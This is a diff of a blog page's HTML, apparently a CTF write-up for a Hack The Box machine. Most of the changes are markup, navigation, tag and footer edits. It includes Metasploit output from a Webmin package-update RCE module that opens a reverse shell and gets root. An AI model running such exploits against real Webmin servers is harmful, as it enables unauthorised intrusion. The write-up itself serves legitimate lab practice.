+</pre></td><td class="rouge-code"><pre>msf5 exploit<span class="o">(</span>linux/http/webmin_packageup_rce<span class="o">)</span> <span class="o">&gt;</span> run
 
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.165:9004 
 <span class="o">[</span>+] Session cookie: 8269def18359f1629182b2d26b9f86ed
 <span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to execute the payload...
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>10.10.14.165:9004 -&gt; 10.10.10.160:41404<span class="o">)</span> at 2019-11-28 05:12:27 -0500
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 2 opened <span class="o">(</span>10.10.14.165:9004 -&gt; 10.10.10.160:41404<span class="o">)</span> at 2019-11-28 05:12:27 <span class="nt">-0500</span>
 
-whoami
-root
-id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-ls
-root.txt
-</pre></td></tr></tbody></table>
-</div>
-</div>
+<span class="nb">whoami
+</span>root
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">ls
+</span>root.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
 
 <h2 id="0x05-thanks">0x05 Thanks！</h2>
 
@@ -681,7 +680,7 @@ root.txt
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/2020/01/02/hello-2020/" data-toggle="tooltip" data-placement="top" title="Welcome to WuJ1n9 Blog">
+                        <a href="/2020/01/03/hello-2020/" data-toggle="tooltip" data-placement="top" title="Welcome to WuJ1n9 Blog">
                         Previous<br>
                         <span>Welcome to WuJ1n9 Blog</span>
                         </a>
@@ -782,7 +781,20 @@ root.txt
     <h5><a href="/archive/">FEATURED TAGS</a></h5>
     <div class="tags">
         
-        %0A++++++++%0A++++++++%0A++++++++
+        
+        
+        </a>
+        
+        
+                <a data-sort="0002" 
+                    href="/archive/?tag=CTFHUB"
+                    title="CTFHUB"
+                    rel="2">CTFHUB</a>
+        
+                <a data-sort="0002" 
+                    href="/archive/?tag=writeup"
+                    title="writeup"
+                    rel="2">writeup
     </div>
 </section>
 
@@ -874,14 +886,7 @@ root.txt
 
     <!-- Footer -->
 
-<!-- <div id="backtotop" style="opacity: 1; display: none;">
-    <div class="backtotop-btn">
-      <div class="arrow-upward"></div>
-      <div class="vertical-stick"></div>
-    </div>
-  </div> -->
-
-  <div class="back-to-top back-to-top-on" style="opacity: 1; display: none;">
+<div class="back-to-top back-to-top-on" style="opacity: 1; display: none;">
     <i class="fa fa-arrow-up">
     </i>
   </div>
@@ -954,23 +959,11 @@ root.txt
                         frameborder="0" scrolling="0" width="100px" height="20px"
                         src="https://ghbtns.com/github-btn.html?user=huxpro&repo=huxpro.github.io&type=star&count=true" >
                     </iframe>
-                    <br>
-                          <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
-                            <span class="post-meta-item-icon">
-                              <i class="fa fa-eye"></i>
-                            </span>
-                            <span class="site-pv" title="总访问量">
-                              <span id="busuanzi_value_site_pv"></span>
-                            </span>
-                          </span>
-                      </div>
                 </p>
             </div>
         </div>
     </div>
 </footer>
-
-
 
 <!-- jQuery -->
 <script src="/js/jquery.min.js "></script>
@@ -986,6 +979,9 @@ root.txt
 <script src="/js/hux-blog.min.js "></script>
 
 <!-- Service Worker -->
+
+<script src="/js/snackbar.js "></script>
+<script src="/js/sw-registration.js "></script>
 
 
 <!-- async load function -->
@@ -1132,7 +1128,6 @@ root.txt
 
 
 <!-- Multi-Lingual -->
-
 
 
 
